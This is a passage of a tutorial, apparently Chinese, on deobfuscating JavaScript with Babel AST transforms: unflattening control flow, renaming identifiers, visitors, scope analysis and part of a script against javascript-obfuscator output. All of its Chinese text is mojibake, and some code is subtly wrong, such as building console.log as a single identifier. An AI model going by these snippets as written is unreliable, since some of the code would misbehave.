<span class="w">            </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>: (å¤æ‚ï¼Œéœ€è¦ç¬¦å·æ‰§è¡Œ)</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç®€åŒ–ç‰ˆï¼šæå–é¡ºåºæ‰§è¡Œçš„ case</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">WhileStatement</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// æ£€æŸ¥æ˜¯å¦æ˜¯ switch è¯­å¥</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isSwitchStatement</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">body</span><span class="p">[</span><span class="mf">0</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">switchNode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">body</span><span class="p">.</span><span class="nx">body</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">cases</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">switchNode</span><span class="p">.</span><span class="nx">cases</span><span class="p">;</span>

<span class="w">            </span><span class="c1">// æŒ‰ case å€¼æ’åº</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">sortedCases</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cases</span><span class="p">.</span><span class="nx">sort</span><span class="p">((</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">b</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">            </span><span class="p">});</span>

<span class="w">            </span><span class="c1">// æå–æ‰€æœ‰ case çš„ bodyï¼ˆå»é™¤ breakï¼‰</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">statements</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sortedCases</span><span class="p">.</span><span class="nx">flatMap</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">consequent</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">s</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="o">!</span><span class="nx">t</span><span class="p">.</span><span class="nx">isBreakStatement</span><span class="p">(</span><span class="nx">s</span><span class="p">));</span>
<span class="w">            </span><span class="p">});</span>

<span class="w">            </span><span class="c1">// æ›¿æ¢æ•´ä¸ª while è¯­å¥</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWithMultiple</span><span class="p">(</span><span class="nx">statements</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="25-æ ‡è¯†ç¬¦é‡å‘½å">2.5 æ ‡è¯†ç¬¦é‡å‘½å</h3>

      <p><strong>é—®é¢˜</strong>: æ··æ·†å™¨æŠŠæ‰€æœ‰å˜é‡åæ”¹æˆ <code>_0x1a2b</code>, <code>a</code>, <code>b</code>, <code>c</code></p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>: é‡å‘½åä¸ºæœ‰æ„ä¹‰çš„åå­—</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">counter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>

<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Scope</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// éå†ä½œç”¨åŸŸä¸­çš„æ‰€æœ‰ç»‘å®š</span>
<span class="w">        </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">scope</span><span class="p">.</span><span class="nx">bindings</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">name</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// å¦‚æœæ˜¯æ··æ·†çš„åå­—ï¼ˆçŸ­æˆ–åå…­è¿›åˆ¶ï¼‰</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">name</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^[a-z]$|^_0x[0-9a-f]+$/i</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">newName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`var_</span><span class="si">${</span><span class="nx">counter</span><span class="o">++</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">scope</span><span class="p">.</span><span class="nx">rename</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">newName</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ··æ·†å‰</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">a</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">c</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// åæ··æ·†å</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">var_0</span><span class="p">(</span><span class="nx">var_1</span><span class="p">,</span><span class="w"> </span><span class="nx">var_2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">var_1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">var_2</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="3-è¿›é˜¶æŠ€å·§">3. è¿›é˜¶æŠ€å·§</h2>

      <h3 id="31-è‡ªå®šä¹‰-visitor">3.1 è‡ªå®šä¹‰ Visitor</h3>

      <p><strong>Visitor æ¨¡å¼</strong>: Babel ä½¿ç”¨è®¿é—®è€…æ¨¡å¼éå† AST</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">visitor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// è¿›å…¥èŠ‚ç‚¹æ—¶è°ƒç”¨</span>
<span class="w">    </span><span class="nx">enter</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;è¿›å…¥:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">type</span><span class="p">);</span>
<span class="w">    </span><span class="p">},</span>

<span class="w">    </span><span class="c1">// ç¦»å¼€èŠ‚ç‚¹æ—¶è°ƒç”¨</span>
<span class="w">    </span><span class="nx">exit</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ç¦»å¼€:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">type</span><span class="p">);</span>
<span class="w">    </span><span class="p">},</span>

<span class="w">    </span><span class="c1">// é’ˆå¯¹ç‰¹å®šèŠ‚ç‚¹ç±»å‹</span>
<span class="w">    </span><span class="nx">FunctionDeclaration</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;æ‰¾åˆ°å‡½æ•°:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="w">    </span><span class="p">},</span>

<span class="w">    </span><span class="c1">// ç®€å†™å½¢å¼ï¼ˆåªæœ‰ enterï¼‰</span>
<span class="w">    </span><span class="nx">CallExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;å‡½æ•°è°ƒç”¨:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>

<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="nx">visitor</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="32-path-å¯¹è±¡å¸¸ç”¨æ–¹æ³•">3.2 Path å¯¹è±¡å¸¸ç”¨æ–¹æ³•</h3>

      <table>
        <thead>
          <tr>
            <th>æ–¹æ³•</th>
            <th>ä½œç”¨</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>path.node</code></td>
            <td>è·å–å½“å‰ AST èŠ‚ç‚¹</td>
            <td><code>path.node.id.name</code></td>
          </tr>
          <tr>
            <td><code>path.parent</code></td>
            <td>è·å–çˆ¶èŠ‚ç‚¹</td>
            <td><code>path.parent</code></td>
          </tr>
          <tr>
            <td><code>path.scope</code></td>
            <td>è·å–ä½œç”¨åŸŸä¿¡æ¯</td>
            <td><code>path.scope.bindings</code></td>
          </tr>
          <tr>
            <td><code>path.get('key')</code></td>
            <td>è·å–å­è·¯å¾„</td>
            <td><code>path.get('params.0')</code></td>
          </tr>
          <tr>
            <td><code>path.replaceWith(node)</code></td>
            <td>æ›¿æ¢èŠ‚ç‚¹</td>
            <td><code>path.replaceWith(t.numericLiteral(123))</code></td>
          </tr>
          <tr>
            <td><code>path.remove()</code></td>
            <td>åˆ é™¤èŠ‚ç‚¹</td>
            <td><code>path.remove()</code></td>
          </tr>
          <tr>
            <td><code>path.insertBefore(node)</code></td>
            <td>åœ¨å‰é¢æ’å…¥èŠ‚ç‚¹</td>
            <td><code>path.insertBefore(t.expressionStatement(...))</code></td>
          </tr>
          <tr>
            <td><code>path.insertAfter(node)</code></td>
            <td>åœ¨åé¢æ’å…¥èŠ‚ç‚¹</td>
            <td><code>path.insertAfter(t.expressionStatement(...))</code></td>
          </tr>
          <tr>
            <td><code>path.evaluate()</code></td>
            <td>å°è¯•æ±‚å€¼</td>
            <td><code>const result = path.evaluate()</code></td>
          </tr>
        </tbody>
      </table>

      <h3 id="33-scope-ä½œç”¨åŸŸåˆ†æ">3.3 Scope ä½œç”¨åŸŸåˆ†æ</h3>

      <p><strong>æŸ¥æ‰¾å˜é‡ç»‘å®š</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">FunctionDeclaration</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">funcName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// è·å–å‡½æ•°ä½œç”¨åŸŸ</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">scope</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">scope</span><span class="p">;</span>

<span class="w">        </span><span class="c1">// æŸ¥æ‰¾å˜é‡ç»‘å®š</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">binding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">scope</span><span class="p">.</span><span class="nx">getBinding</span><span class="p">(</span><span class="s1">&#39;someVariable&#39;</span><span class="p">);</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">binding</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;å˜é‡å®šä¹‰äº:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">binding</span><span class="p">.</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">loc</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;å¼•ç”¨æ¬¡æ•°:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">binding</span><span class="p">.</span><span class="nx">references</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;æ˜¯å¦è¢«å¼•ç”¨:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">binding</span><span class="p">.</span><span class="nx">referenced</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>é‡å‘½åå˜é‡ï¼ˆåŒ…æ‹¬æ‰€æœ‰å¼•ç”¨ï¼‰</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Identifier</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;oldName&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">scope</span><span class="p">.</span><span class="nx">rename</span><span class="p">(</span><span class="s1">&#39;oldName&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;newName&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="34-ç±»å‹æ£€æŸ¥ä¸åˆ›å»º">3.4 ç±»å‹æ£€æŸ¥ä¸åˆ›å»º</h3>

      <p><strong>æ£€æŸ¥èŠ‚ç‚¹ç±»å‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isIdentifier</span><span class="p">(</span><span class="nx">node</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;è¿™æ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isIdentifier</span><span class="p">(</span><span class="nx">node</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;foo&#39;</span><span class="w"> </span><span class="p">}))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;è¿™æ˜¯åä¸º foo çš„æ ‡è¯†ç¬¦&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isFunctionDeclaration</span><span class="p">(</span><span class="nx">node</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;è¿™æ˜¯ä¸€ä¸ªå‡½æ•°å£°æ˜&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>åˆ›å»ºæ–°èŠ‚ç‚¹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åˆ›å»ºæ•°å­—å­—é¢é‡</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">numericLiteral</span><span class="p">(</span><span class="mf">123</span><span class="p">);</span>

<span class="c1">// åˆ›å»ºå­—ç¬¦ä¸²å­—é¢é‡</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">stringLiteral</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">);</span>

<span class="c1">// åˆ›å»ºæ ‡è¯†ç¬¦</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">identifier</span><span class="p">(</span><span class="s1">&#39;myVar&#39;</span><span class="p">);</span>

<span class="c1">// åˆ›å»ºå‡½æ•°è°ƒç”¨</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">call</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">callExpression</span><span class="p">(</span>
<span class="w">    </span><span class="nx">t</span><span class="p">.</span><span class="nx">identifier</span><span class="p">(</span><span class="s1">&#39;console.log&#39;</span><span class="p">),</span>
<span class="w">    </span><span class="p">[</span><span class="nx">t</span><span class="p">.</span><span class="nx">stringLiteral</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">)]</span>
<span class="p">);</span>

<span class="c1">// åˆ›å»ºå˜é‡å£°æ˜</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">varDecl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">variableDeclaration</span><span class="p">(</span><span class="s1">&#39;const&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="nx">t</span><span class="p">.</span><span class="nx">variableDeclarator</span><span class="p">(</span>
<span class="w">        </span><span class="nx">t</span><span class="p">.</span><span class="nx">identifier</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">),</span>
<span class="w">        </span><span class="nx">t</span><span class="p">.</span><span class="nx">numericLiteral</span><span class="p">(</span><span class="mf">10</span><span class="p">)</span>
<span class="w">    </span><span class="p">)</span>
<span class="p">]);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="4-å®Œæ•´åæ··æ·†è„šæœ¬ç¤ºä¾‹">4. å®Œæ•´åæ··æ·†è„šæœ¬ç¤ºä¾‹</h2>

      <h3 id="41-é’ˆå¯¹-javascript-obfuscator">4.1 é’ˆå¯¹ javascript-obfuscator</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/parser&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/traverse&#39;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">generator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/generator&#39;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/types&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>

<span class="c1">// è¯»å–æ··æ·†ä»£ç </span>
<span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;obfuscated.js&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;utf-8&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">ast</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>

<span class="c1">// ========== æ­¥éª¤ 1: å¸¸é‡æŠ˜å  ==========</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">BinaryExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">confident</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">valueToNode</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">value</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// ========== æ­¥éª¤ 2: å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ ==========</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">stringArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>

<span class="c1">// æå–å­—ç¬¦ä¸²æ•°ç»„</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">VariableDeclarator</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isArrayExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">init</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">init</span><span class="p">.</span><span class="nx">elements</span><span class="p">.</span><span class="nx">every</span><span class="p">(</span><span class="nx">e</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">isStringLiteral</span><span class="p">(</span><span class="nx">e</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">stringArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">init</span><span class="p">.</span><span class="nx">elements</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">e</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[å­—ç¬¦ä¸²æ•°ç»„] æ‰¾åˆ° </span><span class="si">${</span><span class="nx">stringArray</span><span class="p">.</span><span class="nx">length</span><span class="si">}</span><span class="sb"> ä¸ªå­—ç¬¦ä¸²`</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// è®°å½•æ•°ç»„å</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">arrayName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>

<span class="w">            </span><span class="c1">// æ›¿æ¢æ‰€æœ‰å¼•ç”¨</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">scope</span><span class="p">.</span><span class="nx">traverse</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">scope</span><span class="p">.</span><span class="nx">block</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">MemberExpression</span><span class="p">(</span><span class="nx">innerPath</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isIdentifier</span><span class="p">(</span><span class="nx">innerPath</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">object</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="nx">arrayName</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">                        </span><span class="nx">t</span><span class="p">.</span><span class="nx">isNumericLiteral</span><span class="p">(</span><span class="nx">innerPath</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                        </span><span class="kd">const</span><span class="w"> </span><span class="nx">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">innerPath</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">index</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">stringArray</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                            </span><span class="nx">innerPath</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">stringLiteral</span><span class="p">(</span><span class="nx">stringArray</span><span class="p">[</span><span class="nx">index</span><span class="p">]));</span>
<span class="w">                        </span><span class="p">}</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">});</span>

<span class="w">            </span><span class="c1">// åˆ é™¤æ•°ç»„å®šä¹‰</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// ========== æ­¥éª¤ 3: æ­»ä»£ç æ¶ˆé™¤ ==========</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">IfStatement</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
